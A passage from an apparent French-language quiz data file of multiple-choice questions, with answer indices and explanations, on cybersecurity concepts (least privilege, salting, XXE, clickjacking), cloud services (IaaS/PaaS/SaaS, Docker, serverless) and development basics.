    choices: ["Donner tous les droits par défaut à chaque utilisateur", "N'accorder à chaque utilisateur/service que les accès strictement nécessaires à sa tâche", "Interdire absolument tout accès, sans aucune exception", "Un synonyme strict de zero trust"],
    correctIndex: 1,
    explanation: "Limite l'impact d'un compte compromis : un attaquant qui prend le contrôle d'un compte à faibles privilèges ne peut pas tout faire sur le système.",
  },
  {
    key: "patch-management-importance",
    category: "CYBERSECURITY",
    prompt: "Pourquoi appliquer rapidement les mises à jour de sécurité (patch management) est-il crucial ?",
    choices: ["Ça n'a pas vraiment d'impact réel sur la sécurité", "Beaucoup d'attaques exploitent des vulnérabilités déjà connues et corrigées, mais non appliquées par la victime", "Les mises à jour ralentissent toujours le système", "Seuls les serveurs ont besoin d'être mis à jour, jamais les postes utilisateurs"],
    correctIndex: 1,
    explanation: "Une fois une faille publiquement documentée (CVE), le temps entre la publication du correctif et son application réelle est une fenêtre d'opportunité pour les attaquants.",
  },
  {
    key: "brute-force-attack-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'une attaque par force brute ?",
    choices: ["Intercepter le trafic réseau d'une victime", "Essayer systématiquement toutes les combinaisons possibles d'un mot de passe jusqu'à trouver la bonne", "Injecter du code SQL malveillant", "Envoyer un email frauduleux"],
    correctIndex: 1,
    explanation: "Un mot de passe long et complexe rend une attaque par force brute exponentiellement plus longue à réussir.",
  },
  {
    key: "dictionary-attack-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'une attaque par dictionnaire ?",
    choices: ["Tester une liste de mots de passe courants ou déjà fuités, plutôt que toutes les combinaisons possibles", "Traduire un mot de passe dans une autre langue", "Chiffrer un fichier avec un dictionnaire de mots", "Un synonyme exact de phishing"],
    correctIndex: 0,
    explanation: "Bien plus rapide qu'une force brute exhaustive, car elle cible en priorité les mots de passe réellement utilisés en pratique (\"123456\", \"password\"...).",
  },
  {
    key: "salting-purpose",
    category: "CYBERSECURITY",
    prompt: "Pourquoi ajoute-t-on un sel (salt) avant de hacher un mot de passe ?",
    choices: ["Pour accélérer le calcul du hachage", "Pour empêcher les attaques par table précalculée (rainbow table) en rendant chaque hash unique", "Pour compresser le mot de passe", "Pour le rendre visuellement plus court"],
    correctIndex: 1,
    explanation: "Sans sel, deux utilisateurs avec le même mot de passe auraient exactement le même hash — un sel unique par utilisateur élimine cette faiblesse.",
  },
  {
    key: "vulnerability-vs-exploit",
    category: "CYBERSECURITY",
    prompt: "Quelle est la différence entre une vulnérabilité et un exploit ?",
    choices: ["Ce sont des synonymes stricts", "Une vulnérabilité est une faiblesse ; un exploit est le code/technique qui l'exploite réellement", "Un exploit existe toujours avant la vulnérabilité qu'il cible", "Une vulnérabilité ne concerne que les mots de passe"],
    correctIndex: 1,
    explanation: "Une vulnérabilité peut exister sans qu'aucun exploit public ne circule pour l'exploiter — mais ce n'est qu'une question de temps une fois publiquement documentée.",
  },
  {
    key: "cve-acronym-def",
    category: "CYBERSECURITY",
    prompt: "Que signifie l'acronyme CVE en cybersécurité ?",
    choices: ["Common Vulnerabilities and Exposures — un identifiant standardisé pour une vulnérabilité connue", "Certified Vulnerability Expert", "Cyber Virus Elimination", "Un type spécifique de pare-feu"],
    correctIndex: 0,
    explanation: "Un identifiant CVE (ex: CVE-2024-12345) permet de référencer et suivre une vulnérabilité spécifique de façon universelle entre outils et équipes.",
  },
  {
    key: "defense-in-depth-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que la défense en profondeur (defense in depth) ?",
    choices: ["Se reposer sur un seul mécanisme de sécurité très robuste", "Superposer plusieurs couches de sécurité indépendantes, pour qu'une seule faille ne compromette pas tout", "Un synonyme exact de pare-feu", "Ignorer volontairement les mises à jour de sécurité mineures"],
    correctIndex: 1,
    explanation: "Si une couche est contournée (ex: un mot de passe volé), d'autres couches (MFA, permissions limitées, monitoring...) limitent quand même les dégâts.",
  },
  {
    key: "sandbox-security-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un sandbox (bac à sable) en sécurité informatique ?",
    choices: ["Un type de virus informatique", "Un environnement isolé où exécuter du code non fiable sans risque pour le système réel", "Un pare-feu physique dédié", "Un protocole de chiffrement spécifique"],
    correctIndex: 1,
    explanation: "Utilisé par exemple pour analyser un fichier suspect en toute sécurité, ou tester du code non vérifié sans risquer le système hôte.",
  },
  {
    key: "spoofing-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que le spoofing en cybersécurité ?",
    choices: ["Chiffrer une communication de bout en bout", "Falsifier une identité (adresse IP, email, site web...) pour tromper la victime", "Scanner les ports ouverts d'un réseau", "Sauvegarder automatiquement des données"],
    correctIndex: 1,
    explanation: "Un email de \"spoofing\" fait croire qu'il vient d'un expéditeur légitime alors que son origine réelle est totalement différente.",
  },
  {
    key: "keylogger-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un keylogger ?",
    choices: ["Un logiciel antivirus", "Un logiciel malveillant qui enregistre les frappes clavier de la victime, souvent pour voler des identifiants", "Un gestionnaire de mots de passe légitime", "Un pare-feu réseau"],
    correctIndex: 1,
    explanation: "Un keylogger peut capturer directement les mots de passe tapés, contournant même un mot de passe très fort — d'où l'intérêt du MFA en complément.",
  },
  {
    key: "security-through-obscurity",
    category: "CYBERSECURITY",
    prompt: "Pourquoi la 'sécurité par l'obscurité' (cacher le fonctionnement plutôt que le sécuriser réellement) est-elle risquée si utilisée SEULE ?",
    choices: ["Parce que cacher le code source est toujours illégal", "Parce qu'elle ne résiste pas si le secret est découvert — elle ne doit jamais être l'unique ligne de défense", "Parce qu'elle ralentit systématiquement le système", "Ce n'est pas du tout un problème reconnu en sécurité"],
    correctIndex: 1,
    explanation: "Un bon système de sécurité doit rester sûr même si son fonctionnement interne est publiquement connu (principe de Kerckhoffs) — la vraie protection vient des clés/secrets, pas du secret de l'algorithme.",
  },
  {
    key: "supply-chain-attack-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'une attaque de la chaîne d'approvisionnement (supply chain attack) ?",
    choices: ["Attaquer directement le site web principal de la victime", "Compromettre un composant tiers (dépendance, fournisseur) utilisé par la cible pour l'atteindre indirectement", "Un synonyme exact de DDoS", "Une attaque physique visant un data center"],
    correctIndex: 1,
    explanation: "Compromettre un paquet npm largement utilisé, par exemple, peut affecter des milliers de projets qui en dépendent, sans attaquer chacun directement.",
  },
  {
    key: "incident-response-def",
    category: "CYBERSECURITY",
    prompt: "Que désigne la réponse à incident (incident response) en cybersécurité ?",
    choices: ["Le processus structuré de détection, confinement, éradication et récupération après une compromission de sécurité", "Un logiciel antivirus spécifique", "Un type particulier de pare-feu", "Un synonyme de test d'intrusion"],
    correctIndex: 0,
    explanation: "Avoir un plan de réponse à incident préparé À L'AVANCE réduit énormément les dégâts et le temps de récupération en cas de vraie compromission.",
  },
  {
    key: "clickjacking-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que le clickjacking ?",
    choices: ["Voler un mot de passe par force brute", "Superposer une page invisible pour piéger l'utilisateur à cliquer sur autre chose que ce qu'il croit cliquer", "Un type spécifique de ransomware", "Un protocole VPN"],
    correctIndex: 1,
    explanation: "La victime croit cliquer sur un bouton inoffensif, alors qu'un élément invisible superposé déclenche une action différente (ex: valider un achat, activer une permission).",
  },
  {
    key: "security-audit-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un audit de sécurité ?",
    choices: ["Une simulation d'attaque non autorisée", "Une évaluation méthodique et autorisée des mesures de sécurité d'un système", "Un logiciel espion", "Un type de malware spécifique"],
    correctIndex: 1,
    explanation: "Contrairement à un pentest qui exploite activement des failles, un audit vérifie souvent la conformité aux bonnes pratiques et politiques de sécurité.",
  },
  {
    key: "honeypot-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un honeypot en cybersécurité ?",
    choices: ["Un antivirus gratuit", "Un système leurre délibérément vulnérable, déployé pour attirer et étudier les attaquants", "Un type de VPN spécifique", "Un pare-feu physique"],
    correctIndex: 1,
    explanation: "Un honeypot permet d'observer les techniques d'attaquants réels dans un environnement contrôlé, sans risque pour les vrais systèmes de production.",
  },
  {
    key: "data-breach-def",
    category: "CYBERSECURITY",
    prompt: "Que désigne une 'fuite de données' (data breach) ?",
    choices: ["Une mise à jour de sécurité classique", "L'accès, la divulgation ou le vol non autorisé de données sensibles", "Un simple ralentissement réseau", "Un type de sauvegarde automatique"],
    correctIndex: 1,
    explanation: "Une fuite de données peut résulter d'un piratage, mais aussi d'une simple erreur de configuration exposant des données publiquement par accident.",
  },
  {
    key: "cyber-hygiene-def",
    category: "CYBERSECURITY",
    prompt: "Que recouvre l' 'hygiène cyber' (cyber hygiene) au quotidien ?",
    choices: ["Uniquement l'installation d'un antivirus", "Les bonnes pratiques régulières : mots de passe uniques, mises à jour, sauvegardes, vigilance face au phishing...", "Un type de chiffrement spécifique", "Un logiciel propriétaire particulier"],
    correctIndex: 1,
    explanation: "Comme l'hygiène corporelle, ce sont des habitudes simples répétées régulièrement qui préviennent la majorité des problèmes courants.",
  },
  {
    key: "threat-actor-def",
    category: "CYBERSECURITY",
    prompt: "Que désigne un 'threat actor' (acteur de la menace) ?",
    choices: ["Un logiciel antivirus", "Une personne ou un groupe à l'origine d'une menace ou d'une attaque informatique", "Un type de pare-feu", "Un protocole réseau spécifique"],
    correctIndex: 1,
    explanation: "Peut désigner un individu isolé, un groupe organisé de cybercriminels, ou même un acteur étatique selon le contexte de la menace.",
  },
  {
    key: "air-gap-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un système 'air-gapped' ?",
    choices: ["Un système connecté à plusieurs réseaux Wi-Fi simultanément", "Un système physiquement isolé de tout réseau (y compris internet) pour le protéger des attaques à distance", "Un type de VPN spécifique", "Un pare-feu purement logiciel"],
    correctIndex: 1,
    explanation: "Utilisé pour des systèmes extrêmement sensibles (contrôle industriel critique...) où aucune connexion réseau n'est jugée acceptable, même indirecte.",
  },
  {
    key: "patch-tuesday-def",
    category: "CYBERSECURITY",
    prompt: "Que désigne le terme 'Patch Tuesday' ?",
    choices: ["Un jour férié dédié à la cybersécurité", "Le jour mensuel régulier où Microsoft publie ses correctifs de sécurité pour Windows", "Un type d'attaque informatique", "Un logiciel antivirus spécifique"],
    correctIndex: 1,
    explanation: "Généralement le deuxième mardi de chaque mois — une cadence prévisible qui aide les équipes IT à planifier le déploiement des correctifs.",
  },
  {
    key: "owasp-purpose",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que l'OWASP ?",
    choices: ["Une entreprise qui vend des pare-feu", "Une fondation à but non lucratif qui publie des ressources et référentiels de sécurité applicative (dont le fameux Top 10)", "Un protocole de chiffrement", "Un type de malware"],
    correctIndex: 1,
    explanation: "L'OWASP (Open Worldwide Application Security Project) est une référence largement reconnue en sécurité des applications web, avec des ressources gratuites et ouvertes.",
  },

  // CLOUD
  {
    key: "saas-def",
    category: "CLOUD",
    prompt: "Que signifie SaaS dans le contexte du cloud ?",
    choices: ["Security as a Service", "Software as a Service — un logiciel prêt à l'emploi accessible via internet, sans rien installer", "Storage as a Service", "System as a Service"],
    correctIndex: 1,
    explanation: "Gmail, Notion, Slack sont des exemples de SaaS : tu utilises le service directement dans le navigateur, sans gérer aucune infrastructure sous-jacente.",
  },
  {
    key: "paas-def",
    category: "CLOUD",
    prompt: "Que signifie PaaS (Platform as a Service) ?",
    choices: ["Un service qui fournit une plateforme complète pour développer/déployer des applications sans gérer l'infrastructure sous-jacente", "Un logiciel complet prêt à l'emploi", "Un synonyme exact de SaaS", "Une plateforme de développement uniquement, sans hébergement"],
    correctIndex: 0,
    explanation: "Le fournisseur PaaS gère les serveurs, l'OS et le runtime ; le développeur se concentre sur le code de son application.",
  },
  {
    key: "iaas-def",
    category: "CLOUD",
    prompt: "Que signifie IaaS (Infrastructure as a Service) ?",
    choices: ["Louer une infrastructure informatique brute (serveurs virtuels, stockage, réseau) sans logiciel préinstallé", "Un logiciel complet prêt à l'emploi", "Un synonyme exact de PaaS", "Une plateforme de développement uniquement"],
    correctIndex: 0,
    explanation: "Avec l'IaaS, le client gère lui-même l'OS et tout ce qui tourne dessus ; le fournisseur ne gère que le matériel physique et la virtualisation.",
  },
  {
    key: "auto-scaling-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que l'auto-scaling dans le cloud ?",
    choices: ["Ajuster automatiquement le nombre de ressources (serveurs) selon la charge réelle observée", "Une sauvegarde automatique quotidienne", "Un chiffrement automatique des données stockées", "Un type de load balancer uniquement"],
    correctIndex: 0,
    explanation: "Si le trafic explose, l'auto-scaling ajoute des instances automatiquement ; il les retire quand la charge redescend, optimisant les coûts.",
  },
  {
    key: "availability-zone-def",
    category: "CLOUD",
    prompt: "Qu'est-ce qu'une 'zone de disponibilité' (Availability Zone) chez un fournisseur cloud ?",
    choices: ["Un centre de données isolé au sein d'une région, pour répartir les risques de panne", "Un pays entier dans son intégralité", "Un type de VPN spécifique", "Un synonyme exact de CDN"],
    correctIndex: 0,
    explanation: "Répartir une application sur plusieurs zones de disponibilité protège contre la panne d'un seul data center.",
  },
  {
    key: "object-storage-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que le stockage objet (ex: Amazon S3) ?",
    choices: ["Un système de fichiers classique avec des dossiers imbriqués obligatoires", "Un stockage de fichiers/données sous forme d'objets identifiés par une clé, accessible via API, hautement scalable", "Une base de données relationnelle", "Un type de VPN"],
    correctIndex: 1,
    explanation: "Idéal pour stocker des images, vidéos ou sauvegardes à très grande échelle, sans les contraintes d'une arborescence de dossiers classique.",
  },
  {
    key: "managed-database-def",
    category: "CLOUD",
    prompt: "Qu'apporte une base de données 'managée' (managed database) par un fournisseur cloud ?",
    choices: ["Rien de plus qu'une base auto-hébergée classique", "Le fournisseur gère les sauvegardes, mises à jour et la haute disponibilité à ta place", "Elle est toujours entièrement gratuite", "Elle ne supporte que le SQL, jamais d'autres modèles de données"],
    correctIndex: 1,
    explanation: "Tu te concentres sur ton schéma et tes requêtes, pendant que le fournisseur s'occupe de la maintenance opérationnelle de la base elle-même.",
  },
  {
    key: "pay-as-you-go-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que le modèle 'pay-as-you-go' dans le cloud ?",
    choices: ["Payer un abonnement fixe annuel obligatoire", "Payer uniquement pour les ressources réellement consommées, sans engagement long terme", "Un service entièrement gratuit à vie", "Un synonyme exact d'IaaS"],
    correctIndex: 1,
    explanation: "Contrairement à l'achat d'un serveur physique, tu ne payes que ce que tu utilises réellement, et tu peux ajuster à tout moment.",
  },
  {
    key: "multi-cloud-def",
    category: "CLOUD",
    prompt: "Qu'est-ce qu'une stratégie 'multi-cloud' ?",
    choices: ["Utiliser plusieurs fournisseurs cloud différents (ex: AWS + Google Cloud) plutôt qu'un seul", "Avoir plusieurs comptes chez le même fournisseur unique", "Un synonyme exact de serverless", "Utiliser uniquement des serveurs physiques on-premise"],
    correctIndex: 0,
    explanation: "Réduit la dépendance à un seul fournisseur (vendor lock-in), au prix d'une complexité opérationnelle plus élevée.",
  },
  {
    key: "vpc-def",
    category: "CLOUD",
    prompt: "Qu'est-ce qu'un VPC (Virtual Private Cloud) ?",
    choices: ["Un antivirus cloud", "Un réseau virtuel isolé et privé au sein de l'infrastructure d'un fournisseur cloud", "Un type de base de données spécifique", "Un synonyme exact de CDN"],
    correctIndex: 1,
    explanation: "Permet de définir ses propres sous-réseaux, règles de routage et de sécurité, comme si on avait son propre datacenter privé virtuel.",
  },
  {
    key: "docker-vs-vm",
    category: "CLOUD",
    prompt: "Quelle est la différence principale entre un conteneur Docker et une machine virtuelle (VM) ?",
    choices: ["Aucune différence réelle", "Un conteneur partage le noyau de l'hôte (plus léger), une VM virtualise un OS complet (plus lourd mais plus isolé)", "Une VM démarre toujours plus vite qu'un conteneur", "Docker ne fonctionne que sous Windows"],
    correctIndex: 1,
    explanation: "C'est pourquoi les conteneurs démarrent en quelques secondes (voire moins) alors qu'une VM peut prendre plusieurs dizaines de secondes à booter un OS entier.",
  },
  {
    key: "docker-compose-def",
    category: "CLOUD",
    prompt: "À quoi sert `docker compose` ?",
    choices: ["Compresser une image Docker", "Définir et lancer plusieurs conteneurs liés (ex: app + base de données) via un seul fichier de configuration", "Scanner les vulnérabilités d'une image", "Créer un compte sur Docker Hub"],
    correctIndex: 1,
    explanation: "Un fichier `docker-compose.yml` décrit tous les services d'une application et leurs liens réseau — un seul `docker compose up` les lance tous ensemble.",
  },
  {
    key: "cdn-edge-def",
    category: "CLOUD",
    prompt: "Pourquoi dit-on qu'un CDN sert du contenu 'en périphérie' (edge) ?",
    choices: ["Parce qu'il ne fonctionne qu'en bordure de ville", "Parce qu'il sert le contenu depuis des serveurs proches géographiquement de l'utilisateur, plutôt que depuis un serveur central unique", "Parce qu'il est toujours payant au-delà d'un certain usage", "Parce qu'il remplace complètement le DNS"],
    correctIndex: 1,
    explanation: "\"Edge\" (périphérie) s'oppose au \"core\" (centre) — le contenu est rapproché physiquement des utilisateurs finaux pour réduire la latence.",
  },
  {
    key: "iac-terraform-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que l'Infrastructure as Code (IaC, ex: Terraform) ?",
    choices: ["Écrire l'infrastructure cloud (serveurs, réseaux...) sous forme de fichiers de configuration versionnables, plutôt que de tout configurer manuellement via une interface", "Un langage de programmation pour applications web", "Un synonyme exact de serverless", "Un outil de test unitaire"],
    correctIndex: 0,
    explanation: "Permet de recréer une infrastructure identique de façon reproductible, et de suivre son historique de changements comme n'importe quel code source.",
  },
  {
    key: "object-vs-file-storage",
    category: "CLOUD",
    prompt: "Quelle est la différence entre le stockage objet (type S3) et un système de fichiers classique ?",
    choices: ["Aucune différence réelle", "Le stockage objet n'a pas de hiérarchie de dossiers imposée et s'accède via API, contrairement à un système de fichiers avec une arborescence classique", "Le système de fichiers classique est toujours plus rapide dans le cloud", "Le stockage objet ne peut stocker que du texte brut"],
    correctIndex: 1,
    explanation: "Le stockage objet identifie chaque élément par une clé unique plutôt que par un chemin de dossiers, ce qui simplifie énormément la scalabilité horizontale.",
  },
  {
    key: "shared-responsibility-model",
    category: "CLOUD",
    prompt: "Qu'est-ce que le 'modèle de responsabilité partagée' dans le cloud ?",
    choices: ["Le fournisseur cloud est responsable de tout, y compris de la configuration faite par le client", "Le fournisseur sécurise l'infrastructure sous-jacente, mais le client reste responsable de la sécurité de sa configuration et de ses données", "Le client est responsable de tout, y compris du matériel physique", "Un concept qui ne s'applique qu'à un seul fournisseur cloud en particulier"],
    correctIndex: 1,
    explanation: "Une mauvaise configuration d'accès par le client (ex: un bucket de stockage laissé public par erreur) reste de sa responsabilité, même si l'infrastructure elle-même est sécurisée par le fournisseur.",
  },
  {
    key: "docker-image-vs-container",
    category: "CLOUD",
    prompt: "Quelle est la différence entre une image Docker et un conteneur ?",
    choices: ["Ce sont des synonymes stricts", "Une image est un modèle figé (comme une classe), un conteneur est une instance en cours d'exécution de cette image (comme un objet)", "Un conteneur ne peut jamais exister sans connexion internet", "Une image ne peut être utilisée qu'une seule fois avant suppression"],
    correctIndex: 1,
    explanation: "On peut lancer plusieurs conteneurs différents à partir de la MÊME image, exactement comme on peut créer plusieurs objets à partir d'une même classe.",
  },
  {
    key: "spot-instance-def",
    category: "CLOUD",
    prompt: "Que sont les instances 'spot' dans le cloud (par opposition aux instances à la demande) ?",
    choices: ["Des instances plus chères mais garanties en permanence", "De la capacité de calcul inutilisée vendue moins cher, mais pouvant être récupérée par le fournisseur à tout moment", "Un type de stockage uniquement", "Un synonyme exact de serverless"],
    correctIndex: 1,
    explanation: "Adapté aux tâches tolérantes aux interruptions (calcul par lot, traitement asynchrone) grâce à leur coût nettement réduit.",
  },
  {
    key: "serverless-cold-start",
    category: "CLOUD",
    prompt: "Qu'est-ce que le 'cold start' en informatique serverless ?",
    choices: ["Un redémarrage manuel effectué par un administrateur", "Le délai supplémentaire au premier appel d'une fonction après une période d'inactivité, le temps que l'environnement démarre", "Un type de panne réseau", "Un synonyme exact de load balancing"],
    correctIndex: 1,
    explanation: "Une fonction fréquemment appelée reste \"chaude\" (pas de délai) ; après une période d'inactivité, le premier appel suivant subit ce délai de démarrage.",
  },
  {
    key: "container-registry-def",
    category: "CLOUD",
    prompt: "À quoi sert un registre de conteneurs (container registry, ex: Docker Hub) ?",
    choices: ["Stocker et distribuer des images de conteneurs", "Exécuter directement des conteneurs sans jamais les télécharger", "Chiffrer les mots de passe des utilisateurs", "Un synonyme exact de Kubernetes"],
    correctIndex: 0,
    explanation: "`docker pull nginx` télécharge l'image \"nginx\" depuis un registre public — Docker Hub en est l'exemple le plus connu.",
  },
  {
    key: "disaster-recovery-def",
    category: "CLOUD",
    prompt: "Que désigne un plan de reprise après sinistre (disaster recovery) dans le cloud ?",
    choices: ["Une stratégie pour restaurer rapidement services et données après une panne majeure", "Un antivirus cloud spécifique", "Un type de VPN", "Un synonyme exact d'auto-scaling"],
    correctIndex: 0,
    explanation: "Inclut typiquement des sauvegardes régulières testées, et une infrastructure de secours (parfois dans une autre région) prête à prendre le relais.",
  },
  {
    key: "dockerfile-cmd-entrypoint",
    category: "CLOUD",
    prompt: "Quelle est une différence clé entre `CMD` et `ENTRYPOINT` dans un Dockerfile ?",
    choices: ["Ce sont des synonymes stricts", "`ENTRYPOINT` définit la commande principale, difficile à surcharger ; `CMD` fournit des arguments par défaut plus facilement remplaçables au lancement", "`CMD` ne fonctionne qu'en environnement de développement", "`ENTRYPOINT` supprime automatiquement le conteneur après usage"],
    correctIndex: 1,
    explanation: "On combine souvent les deux : `ENTRYPOINT` fixe le programme à exécuter, `CMD` fournit ses arguments par défaut, que l'utilisateur peut remplacer facilement au lancement.",
  },
  {
    key: "edge-computing-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que l''edge computing' ?",
    choices: ["Traiter les données au plus près de leur source (capteur, utilisateur) plutôt que de tout envoyer à un data center central", "Un synonyme exact de cloud computing classique", "Un type de base de données spécifique", "Un protocole de chiffrement particulier"],
    correctIndex: 0,
    explanation: "Réduit la latence et la bande passante nécessaire en traitant une partie des données localement, avant (ou sans) remontée vers un serveur central.",
  },
  {
    key: "vendor-lock-in-def",
    category: "CLOUD",
    prompt: "Qu'est-ce que le 'vendor lock-in' dans le cloud ?",
    choices: ["Un type de pare-feu spécifique", "La difficulté (technique ou financière) à changer de fournisseur cloud une fois fortement dépendant de ses services propriétaires", "Un synonyme exact de multi-cloud", "Une fonctionnalité de sécurité standard"],
    correctIndex: 1,
    explanation: "Utiliser massivement des services propriétaires spécifiques à un fournisseur facilite le développement à court terme, mais complique une éventuelle migration future.",
  },
  {
    key: "js-nan-typeof",
    category: "DEVELOPMENT",
    prompt: "En JavaScript, que retourne `typeof NaN` ?",
    choices: ["\"nan\"", "\"undefined\"", "\"number\"", "\"object\""],
    correctIndex: 2,
    explanation: "NaN (Not a Number) est, paradoxalement, du type `number` en JavaScript — c'est une valeur numérique spéciale représentant un résultat non calculable.",
  },
  {
    key: "http-status-201",
    category: "DEVELOPMENT",
    prompt: "Que signifie le code de statut HTTP `201` ?",
    choices: ["Requête invalide", "Ressource créée avec succès", "Ressource introuvable", "Erreur serveur"],
    correctIndex: 1,
    explanation: "201 Created est renvoyé typiquement après un `POST` qui a réussi à créer une nouvelle ressource, souvent avec l'URL de la ressource créée dans l'en-tête `Location`.",
  },
  {
    key: "css-important-purpose",
    category: "DEVELOPMENT",
    prompt: "À quoi sert `!important` en CSS ?",
    choices: ["À accélérer le rendu de la page", "À forcer une règle CSS à outrepasser la spécificité normale des autres règles", "À valider automatiquement le CSS", "À importer un fichier externe"],
    correctIndex: 1,
    explanation: "`!important` outrepasse la cascade normale de spécificité CSS — généralement déconseillé sauf cas exceptionnel, car il rend le débogage des styles plus difficile.",
  },
  {
    key: "python-mutable-default-arg",
    category: "DEVELOPMENT",
    prompt: "Pourquoi utiliser une liste vide `[]` comme valeur par défaut d'un paramètre de fonction Python (`def f(items=[])`) est risqué ?",
    choices: ["Ça lève toujours une erreur", "La même liste est partagée entre tous les appels de la fonction n'ayant pas fourni cet argument", "Les listes ne peuvent pas être des paramètres par défaut", "Ça ralentit systématiquement l'exécution"],
    correctIndex: 1,
    explanation: "En Python, la valeur par défaut est évaluée une seule fois à la définition de la fonction — une liste mutable modifiée dans un appel reste modifiée pour tous les appels suivants.",
  },
  {
    key: "sql-null-comparison",
    category: "DEVELOPMENT",
    prompt: "Pourquoi `WHERE colonne = NULL` ne fonctionne-t-il jamais comme attendu en SQL ?",
    choices: ["C'est une erreur de syntaxe", "NULL représente une valeur inconnue — aucune comparaison avec `=` ne peut être vraie, il faut utiliser `IS NULL`", "NULL est traité comme 0 automatiquement", "Ça fonctionne parfaitement normalement"],
    correctIndex: 1,
    explanation: "NULL signifie 'valeur inconnue' — comparer une inconnue à une autre valeur avec `=` donne toujours un résultat indéterminé (ni vrai ni faux), d'où la nécessité de `IS NULL`/`IS NOT NULL`.",
  },
  {
    key: "git-stash-purpose",
    category: "DEVELOPMENT",
    prompt: "À quoi sert `git stash` ?",
    choices: ["Supprimer définitivement les modifications non commitées", "Mettre de côté temporairement des modifications non commitées pour changer de branche proprement, sans les committer", "Créer une nouvelle branche", "Fusionner deux branches"],
    correctIndex: 1,
    explanation: "`git stash` range les modifications en cours dans une pile temporaire, laissant l'arbre de travail propre — pratique pour changer de branche rapidement sans committer un travail inachevé.",
  },
  {
    key: "npm-package-lock-purpose",
    category: "DEVELOPMENT",
    prompt: "À quoi sert le fichier `package-lock.json` dans un projet Node.js ?",
    choices: ["C'est un fichier optionnel sans réelle utilité", "Il fige les versions exactes de toutes les dépendances (y compris transitives) pour garantir des installations reproductibles", "Il remplace complètement `package.json`", "Il contient le code source compilé"],
    correctIndex: 1,
    explanation: "Sans lockfile, deux installations à des moments différents pourraient récupérer des versions mineures différentes de dépendances transitives — le lockfile garantit une installation identique partout.",
  },
  {
    key: "rest-http-put-vs-patch",
    category: "DEVELOPMENT",
    prompt: "Quelle est la différence conventionnelle entre `PUT` et `PATCH` en REST ?",
    choices: ["Aucune différence, ce sont des synonymes", "`PUT` remplace la ressource entière, `PATCH` applique une modification partielle", "`PATCH` ne fonctionne que sur des fichiers", "`PUT` est utilisé uniquement pour la lecture"],
    correctIndex: 1,
    explanation: "Par convention REST, `PUT` envoie la représentation complète de la ressource à remplacer, tandis que `PATCH` n'envoie que les champs à modifier.",
  },
  {
    key: "async-callback-hell",
    category: "DEVELOPMENT",
    prompt: "Que désigne l'expression 'callback hell' en JavaScript ?",
    choices: ["Un bug rare du moteur V8", "Un empilement de callbacks imbriqués rendant le code asynchrone difficile à lire et maintenir", "Une erreur de syntaxe spécifique", "Une technique d'optimisation recommandée"],
    correctIndex: 1,
    explanation: "Avant les Promises/async-await, enchaîner plusieurs opérations asynchrones dépendantes via des callbacks imbriqués créait un code en forme de pyramide, difficile à lire et à déboguer.",
  },
  {
    key: "xxe-injection-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'une injection XXE (XML External Entity) ?",
    choices: ["Une attaque qui exploite un parseur XML mal configuré pour lire des fichiers locaux ou faire des requêtes internes", "Un type de chiffrement XML", "Une extension de navigateur malveillante", "Un format d'export de base de données"],
    correctIndex: 0,
    explanation: "Un parseur XML qui résout les entités externes sans restriction peut être détourné pour lire des fichiers système (`/etc/passwd`) ou faire des requêtes SSRF depuis le serveur.",
  },
  {
    key: "insecure-deserialization-def",
    category: "CYBERSECURITY",
    prompt: "Pourquoi désérialiser des données non fiables sans validation est-il dangereux ?",
    choices: ["Ce n'est jamais dangereux, uniquement lent", "Un objet sérialisé malveillant peut, selon le langage/la bibliothèque, exécuter du code arbitraire pendant sa reconstruction", "Ça affecte uniquement les performances réseau", "Ça ne concerne que les fichiers CSV"],
    correctIndex: 1,
    explanation: "Certains formats de sérialisation (pickle en Python, certaines libs Java) peuvent exécuter du code pendant la désérialisation — ne jamais désérialiser des données venant d'une source non fiable sans validation stricte.",
  },
  {
    key: "clickjacking-defense",
    category: "CYBERSECURITY",
    prompt: "Quelle en-tête HTTP protège spécifiquement contre le clickjacking en empêchant le chargement d'une page dans une iframe ?",
    choices: ["Content-Type", "X-Frame-Options", "Accept-Language", "Cache-Control"],
    correctIndex: 1,
    explanation: "`X-Frame-Options` (ou la directive CSP `frame-ancestors`, plus moderne) indique au navigateur de refuser d'afficher la page dans une iframe sur un autre domaine.",
  },
  {
    key: "two-factor-vs-mfa",
    category: "CYBERSECURITY",
    prompt: "Quelle est la relation entre 2FA et MFA ?",
    choices: ["Ce sont des concepts totalement différents et sans rapport", "2FA (deux facteurs) est un cas particulier de MFA (authentification multi-facteurs, deux ou plus)", "MFA est un cas particulier de 2FA", "MFA ne concerne que les mots de passe"],
    correctIndex: 1,
    explanation: "MFA (Multi-Factor Authentication) désigne l'usage d'au moins deux facteurs d'authentification différents — 2FA (Two-Factor Authentication) en est le cas le plus courant avec exactement deux facteurs.",
  },
  {
    key: "air-gapped-system-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce qu'un système 'air-gapped' ?",
    choices: ["Un système avec un ventilateur de refroidissement puissant", "Un système physiquement isolé de tout réseau non sécurisé (y compris internet), pour une sécurité maximale", "Un synonyme de pare-feu logiciel", "Un type de connexion sans fil"],
    correctIndex: 1,
    explanation: "L'air-gapping isole physiquement un système sensible (aucune connexion réseau, même indirecte) — utilisé pour des systèmes critiques où le risque d'une compromission distante doit être éliminé structurellement.",
  },
  {
    key: "cyber-kill-chain-def",
    category: "CYBERSECURITY",
    prompt: "Que décrit le modèle de la 'Cyber Kill Chain' ?",
    choices: ["Les étapes successives d'une cyberattaque, de la reconnaissance initiale jusqu'à l'objectif final de l'attaquant", "Un algorithme de chiffrement", "Une liste de mots de passe interdits", "Un protocole réseau"],
